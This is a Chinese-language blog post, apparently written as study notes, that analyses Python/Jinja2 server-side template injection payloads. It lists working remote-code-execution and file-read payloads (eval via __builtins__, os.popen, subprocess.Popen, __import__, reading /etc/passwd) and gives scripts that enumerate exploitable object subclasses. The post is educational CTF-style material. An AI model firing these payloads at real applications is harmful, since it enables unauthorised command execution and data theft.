@@ -1,0 +1,444 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Python SSTI学习 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Python SSTI学习 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前人之述备矣Python SSTI漏洞学习总结，这里只学习一下文中payload的原理。
+背景知识
+SSTI 攻击思路
+
+选择一个类，如：'', [], {}
+通过这个类找到object类，这是 Python 中所有类的基类：__base_..." />
+    <meta name="keywords" content="SSTI,Python" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Python SSTI学习
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-06-14
+              </span>
+              <span>
+                13 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/h0Nu9_pAP/" class="post-tag">
+                  # SSTI
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/c6PC98FOD/" class="post-tag">
+                  # Python
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/python-ssti-xue-xi.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>前人之述备矣<a href="https://www.cnblogs.com/tuzkizki/p/15394415.html">Python SSTI漏洞学习总结</a>，这里只学习一下文中payload的原理。</p>
+<h1 id="背景知识">背景知识</h1>
+<h2 id="ssti-攻击思路">SSTI 攻击思路</h2>
+<ul>
+<li>选择一个类，如：<code>''</code>, <code>[]</code>, <code>{}</code></li>
+<li>通过这个类找到object类，这是 Python 中所有类的基类：<code>__base__</code>，<code>__bases__</code>，<code>__mro__</code></li>
+<li>通过object类获取所有子类：<code>__subclasses__()</code></li>
+<li>在子类列表中找到可以利用的类</li>
+<li>直接调用类下面函数或使用该类空间下可用的其他模块的函数</li>
+</ul>
+<h2 id="python-魔术方法">Python 魔术方法</h2>
+<ul>
+<li><strong><strong>init</strong></strong>: 对象的初始化方法</li>
+<li><strong><strong>class</strong></strong>: 返回对象所属的类</li>
+<li><strong><strong>module</strong></strong>: 返回类所在的模块</li>
+<li><strong><strong>mro</strong></strong>: 返回类的调用顺序，可以此找到其父类（用于找父类）</li>
+<li><strong><strong>base</strong></strong>: 获取类的直接父类（用于找父类）</li>
+<li><strong><strong>bases</strong></strong>: 获取父类的元组，按它们出现的先后排序（用于找父类）</li>
+<li><strong><strong>dict</strong></strong>: 返回当前类的函数、属性、全局变量等</li>
+<li><strong><strong>subclasses</strong></strong>: 返回所有仍处于活动状态的引用的列表，列表按定义顺序排列（用于找子类）</li>
+<li><strong><strong>globals</strong></strong>: 获取函数所属空间下可使用的模块、方法及变量（用于访问全局变量）</li>
+<li><strong><strong>import</strong></strong>: 用于导入模块，经常用于导入os模块</li>
+<li><strong><strong>builtins</strong></strong>: 返回Python中的内置函数，如eval</li>
+</ul>
+<h1 id="payload分析">Payload分析</h1>
+<p>在 Python 中，object 是所有类的基类。所有Python类，无论是内置的，还是用户定义的，都继承自object类。所以，大多数SSTI的Payload都会先获取到object类，在从object的子类中寻找可以利用的类。</p>
+<pre><code class="language-python"># 获取子类
+''.__class__.__base__.__subclasses__()
+''.__class__.__bases__[0].__subclasses__()
+''.__class__.__mro__[-1].__subclasses__()
+</code></pre>
+<p>需要注意的是object的子类列表的顺序可能会因 Python 环境、版本、已导入的模块等多种因素而有所不同。因此，SSTI的大多数题目都要从获取到子类列表开始。</p>
+<p>在文中，作者给出了可以利用的类，以及这些类的利用方法：</p>
+<pre><code class="language-python"># 可以利用的类
+userful_class = ['linecache', 'os._wrap_close', 'subprocess.Popen', 'warnings.catch_warnings', '_frozen_importlib._ModuleLock', '_frozen_importlib._DummyModuleLock', '_frozen_importlib._ModuleLockManager', '_frozen_importlib.ModuleSpec']
+
+
+# 利用warnings.catch_warnings配合__builtins__得到eval函数，直接梭哈（常用）
+{{[].__class__.__base__.__subclasses__()[138].__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('whoami').read()&quot;)}}
+
+# 利用os._wrap_close类所属空间下可用的popen函数进行RCE的payload
+{{&quot;&quot;.__class__.__base__.__subclasses__()[128].__init__.__globals__.popen('whoami').read()}}
+{{&quot;&quot;.__class__.__base__.__subclasses__()[128].__init__.__globals__['popen']('whoami').read()}}
+
+# 利用subprocess.Popen类进行RCE的payload
+{{''.__class__.__base__.__subclasses__()[479]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}
+
+# 利用__import__导入os模块进行利用
+{{&quot;&quot;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}
+
+# 利用linecache类所属空间下可用的os模块进行RCE的payload，假设linecache为第250个子类
+{{&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()}}
+{{[].__class__.__base__.__subclasses__()[250].__init__.func_globals['linecache'].__dict__.['os'].popen('whoami').read()}}
+
+# 利用file类（python3将file类删除了，因此只有python2可用）进行文件读
+{{[].__class__.__base__.__subclasses__()[40]('etc/passwd').read()}}
+{{[].__class__.__base__.__subclasses__()[40]('etc/passwd').readlines()}}
+# 利用file类进行文件写（python2的str类型不直接从属于属于基类，所以要两次 .__bases__）
+{{&quot;&quot;.__class__.__bases[0]__.__bases__[0].__subclasses__()[40]('/tmp').write('test')}}
+
+# 通用getshell，都是通过__builtins__调用eval进行代码执行
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('whoami').read()&quot;) }}{% endif %}{% endfor %}
+# 读写文件，通过__builtins__调用open进行文件读写
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
+</code></pre>
+<p>下面对这些Payload依次进行分析</p>
+<h2 id="__builtins__的eval">__builtins__的eval</h2>
+<p><code>__builtins__</code> 是 Python 中的一个内置模块，它存在于所有 Python 环境中。这个模块包含了很多基本的内置函数和类，例如<code>len()</code>, <code>print()</code>, <code>int()</code>, <code>list()</code>, <code>dict()</code> 等。在SSTI的RCE中，所要利用的就是其中的<code>eval()</code>函数。</p>
+<p>观察上面的payload我们可以发现，利用<code>__builtins__</code>的<code>eval()</code>函数的格式为：<code>__init__.__globals__['__builtins__'].eval()</code>，这个payload 的意思是从一个子类<code>__init__</code>方法的<code>__globals__</code>属性中获取到<code>__builtins__</code>，再调用<code>__builtins__</code>的<code>eval()</code>。</p>
+<p>因为<code>__globals__</code>包含了函数定义时的全局命名空间中的所有信息。，而<code>__builtins__</code>是默认导入的，所以可以用这样的方式获取到。下面看一个简单的例子：</p>
+<pre><code class="language-python"># test.py
+import math
+flag = 'skkyblu3'
+
+class A:
+    def __init__(self):
+        self.a = 1
+
+    def func(self):
+        pass
+
+
+def display(d: dict):       # 用来
+    for k, v in d.items():
+        print(f'{k}: {v}')
+
+
+display(A.__init__.__globals__)
+
+# 输出的结果如下
+# __name__: __main__
+# __doc__: None
+# __package__: None
+# __loader__: &lt;_frozen_importlib_external.SourceFileLoader object at 0x104910c40&gt;
+# __spec__: None
+# __annotations__: {}
+# __builtins__: &lt;module 'builtins' (built-in)&gt;
+# __file__: /Users/ea5ter/Documents/CTF/code/py/ssti/test/test.py
+# __cached__: None
+# math: &lt;module 'math' from '/Users/ea5ter/.pyenv/versions/3.8.11/lib/python3.8/lib-dynload/math.cpython-38-darwin.so'&gt;
+# flag: skkyblu3
+# A: &lt;class '__main__.A'&gt;
+# display: &lt;function display at 0x10495e160&gt;
+</code></pre>
+<p>其中就有<code>__builtins__</code>这个模块，然后就可以像payload中那样使用<code>eval</code>执行代码：<code>A.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('whoami').read()&quot;)</code></p>
+<p>既然<code>__globals__</code>输出的是全局命名空间中的所有信息，所以这里其他几个函数的<code>__globals__</code>属性也是可以一样的，对于这个代码下面的payload也可以达到相同的效果：</p>
+<pre><code class="language-python">A.func.__globals__['__builtins__'].eval(&quot;__import__('os').popen('whoami').read()&quot;)   # A中的func函数
+display.__globals__['__builtins__'].eval(&quot;__import__('os').popen('whoami').read()&quot;)   # display函数
+</code></pre>
+<p>另外还有一个有意思的点，因为<code>A.func.__globals__['__builtins__']</code>返回的是<code>__builtins__</code><strong>模块</strong>，<code>A.func.__globals__['__builtins__'].eval</code>指向的就是这个模块下的方法，所以这种调用是没有问题的：<br>
+<img src="https://skyblu3519.github.io/post-images/1686897715609.png" alt="" loading="lazy"></p>
+<p>但是，如果在另一个文件中调用，<code>A.func.__globals__['__builtins__']</code>就不再是一个<strong>模块</strong>而是一个<strong>字典</strong>，对于一个字典要调用<code>eval()</code>函数，paylad就变成了<code>A.func.__globals__['__builtins__']['eval']</code>：</p>
+<pre><code class="language-python">import test
+
+print(type(test.display.__globals__['__builtins__']))
+print(type(test.display.__globals__['__builtins__']['eval']))
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1686898035913.png" alt="" loading="lazy"></figure>
+<p>造成这样的详细原因可能涉及到一些python的底层，也就不太深究了。总之，结论就是：文件是在被直接执行的环境中<code>__builtins__</code>通常被Python解释器设置为builtins模块；而它作为一个模块导入使用的时候，它的上下文环境发生改变，<code>__builtins__</code>会被设置为一个字典，这个字典包含了builtins模块的所有内容。<br>
+<img src="https://skyblu3519.github.io/post-images/1686898685902.png" alt="" loading="lazy"></p>
+<p>但是文章中的payload用<code>.eval</code>的的调用方式依然是有效的，也许和Jinja2的沙盒环境有关🤔<br>
+<img src="https://skyblu3519.github.io/post-images/1686899196632.png" alt="" loading="lazy"></p>
+<p>在知道这种payload的逻辑后，我们看一下object的子类中还有没有其他可以利用类：</p>
+<pre><code class="language-python">import importlib
+
+def check_class_builtins(class_full_names):
+    for class_full_name in class_full_names:
+        try:
+            module_name, class_name = class_full_name.rsplit('.', 1)
+
+            # 动态导入模块
+            module = importlib.import_module(module_name)
+            # 从模块获取类
+            cls = getattr(module, class_name)
+
+            init_globals = getattr(cls.__init__, '__globals__', None)
+            if init_globals is None:
+                # print(f&quot;{class_full_name}.__init__ does not have __globals__.&quot;)
+                continue
+
+            builtins_type = type(init_globals.get('__builtins__', None))
+            print(f&quot;{class_full_name}.__init__.__globals__['__builtins__'] is {builtins_type}.&quot;)
+
+        except Exception as e:
+            pass
+            # print(f&quot;Error while processing {class_full_name}: {e}&quot;)
+
+
+subclass_names = [f&quot;{cls.__module__}.{cls.__name__}&quot; for cls in object.__subclasses__()]
+# print(subclass_names)
+check_class_builtins(subclass_names)
+</code></pre>
+<p>可以看到除了<code>warnings.catch_warnings</code>还有不少可以像这样<code>.__init__.__globals__['__builtins__']</code>利用的类：</p>
+<pre><code class="language-python">_frozen_importlib._ModuleLock.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+_frozen_importlib._DummyModuleLock.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+_frozen_importlib._ModuleLockManager.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+_frozen_importlib.ModuleSpec.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+_frozen_importlib_external.FileLoader.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+_frozen_importlib_external._NamespacePath.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+_frozen_importlib_external._NamespaceLoader.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+_frozen_importlib_external.FileFinder.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+zipimport.zipimporter.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+zipimport._ZipImportResourceReader.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+codecs.IncrementalEncoder.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+codecs.IncrementalDecoder.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+codecs.StreamReaderWriter.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+codecs.StreamRecoder.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+os._wrap_close.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+_sitebuiltins.Quitter.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+_sitebuiltins._Printer.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+types.DynamicClassAttribute.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+types._GeneratorWrapper.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+warnings.WarningMessage.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+warnings.catch_warnings.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+reprlib.Repr.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+functools.partialmethod.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+functools.singledispatchmethod.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+functools.cached_property.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+contextlib._GeneratorContextManagerBase.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+contextlib._BaseExitStack.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+test.A.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
+</code></pre>
+<h2 id="ospopen">os.popen</h2>
+<p>os模块下的popen函数可用于执行系统命令。</p>
+<p><code>os._wrap_close</code>这个类是在os模块中的，所以像上面那样，在它的全局环境中找到<code>Popen</code>调用即可。</p>
+<p>对应的Payload为：</p>
+<pre><code class="language-python">{{&quot;&quot;.__class__.__base__.__subclasses__()[128].__init__.__globals__.popen('whoami').read()}}
+{{&quot;&quot;.__class__.__base__.__subclasses__()[128].__init__.__globals__['popen']('whoami').read()}}
+</code></pre>
+<h2 id="__import__">__import__()</h2>
+<p><code>__import__</code> 是 Python 的一个<strong>内置函数</strong>，用于动态地导入模块。它提供了一种在运行时根据字符串形式的模块名导入模块的方式。</p>
+<p>在上面的Payload中通过导入<code>os</code>模块执行<code>popen</code>。</p>
+<pre><code class="language-python">{{&quot;&quot;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}
+</code></pre>
+<p>整个格式也差不多，不过这里没说所用的这个类是什么。用脚本搜索一下<code>__globals__</code>中存在<code>__import__</code>的类，一共有四个<code>_frozen_importlib._ModuleLock</code>、<code>_frozen_importlib._DummyModuleLock</code>、<code>_frozen_importlib._ModuleLockManager</code>、<code>_frozen_importlib.ModuleSpec</code>：<br>
+<img src="https://skyblu3519.github.io/post-images/1687264365978.png" alt="" loading="lazy"></p>
+<p>这里还学到了个点，就是当你试图访问一个变量时，Python解释器会首先在当前的<strong>局部命名空间</strong>寻找，如果找不到，就会去<strong>全局命名空间</strong>寻找，如果还找不到，就会去<strong>内置命名空间</strong>寻找。这就是所谓的LEGB规则（Local -&gt; Enclosed -&gt; Global -&gt; Built-in）。</p>
+<p>所以上面那四个类它们是在<strong>全局命名空间</strong>中注册了<code>__import__</code> 函数的。</p>
+<p>不过既然<code>__import__</code>是一个内置函数，那我们也可以在<code>__builtins__</code>中找到。所以也可以像这样调用：</p>
+<pre><code class="language-python"># A为任何一个全局命名空间中存在__builtins__模块的类
+A.__globals__.__builtins__.__import__('os').popen('whoami').read()
+</code></pre>
+<h2 id="subprocesspopen">subprocess.Popen</h2>
+<p><code>subprocess</code>下的<code>Popen</code>类也可以用来执行命令，与之前方法有所区别的是<code>Popen</code>是一个类。</p>
+<pre><code class="language-python">{{subprocess.Popen('whoami',shell=True,stdout=-1).communicate()[0].strip()}}
+</code></pre>
+<p><code>subprocess.Popen('whoami', shell=True, stdout=-1)</code>创建并启动了一个新的子进程来执行 'whoami' 命令。其中：</p>
+<ul>
+<li><code>shell=True</code>：这个参数允许我们通过 <code>shell</code> 来执行命令。</li>
+<li><code>stdout=-1</code>：这个参数意味着子进程的标准输出被重定向到一个管道中。<code>-1</code> 和 <code>subprocess.PIPE</code> 的效果是一样的，都是重定向到一个管道。</li>
+<li><code>communicate()</code> 方法是 <code>Popen</code> 对象的一个方法，它用于与子进程交互。无参数调用时，它会等待子进程完成，然后返回一个包含子进程 <code>stdout</code> 和 <code>stderr</code> 输出的元组。</li>
+<li><code>[0]</code> 是获取元组的第一个元素，即子进程的 <code>stdout</code> 输出。</li>
+<li><code>strip() </code>用于移除字符串头尾的空格和换行符。</li>
+</ul>
+<h1 id="总结">总结</h1>
+<p>剩余的Payload中说到了一个<code>linecache</code>类，但这个<code>linecache</code>在python中是一个模块，并不是object的子类，之后遇到再说吧。</p>
+<p>贴一下在<code>__globals__</code>中找有用东西的代码：</p>
+<pre><code class="language-python">import importlib
+
+
+def check_class_useful(class_full_names, target):
+    for class_full_name in class_full_names:
+        try:
+            module_name, class_name = class_full_name.rsplit('.', 1)
+
+            # 动态导入模块
+            module = importlib.import_module(module_name)
+            # 从模块获取类
+            cls = getattr(module, class_name)
+
+            init_globals = getattr(cls.__init__, '__globals__', None)
+            if init_globals is None:
+                # print(f&quot;{class_full_name}.__init__ does not have __globals__.&quot;)
+                continue
+
+            target_type = init_globals.get(target, None)
+            if target_type:
+                print(f&quot;{class_full_name}.__init__.__globals__.{target} is {type(target_type)}.&quot;)
+
+        except Exception as e:
+            pass
+            # print(f&quot;Error while processing {class_full_name}: {e}&quot;)
+
+
+subclass_names = [f&quot;{cls.__module__}.{cls.__name__}&quot; for cls in object.__subclasses__()]
+target = 'linecache'
+check_class_useful(subclass_names, target)
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86">背景知识</a>
+<ul>
+<li><a href="#ssti-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">SSTI 攻击思路</a></li>
+<li><a href="#python-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95">Python 魔术方法</a></li>
+</ul>
+</li>
+<li><a href="#payload%E5%88%86%E6%9E%90">Payload分析</a>
+<ul>
+<li><a href="#__builtins__%E7%9A%84eval">__builtins__的eval</a></li>
+<li><a href="#ospopen">os.popen</a></li>
+<li><a href="#__import__">__import__()</a></li>
+<li><a href="#subprocesspopen">subprocess.Popen</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/mysql-zhu-cong-fu-zhi/">
+              <h3 class="post-title">
+                MySQL主从复制
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
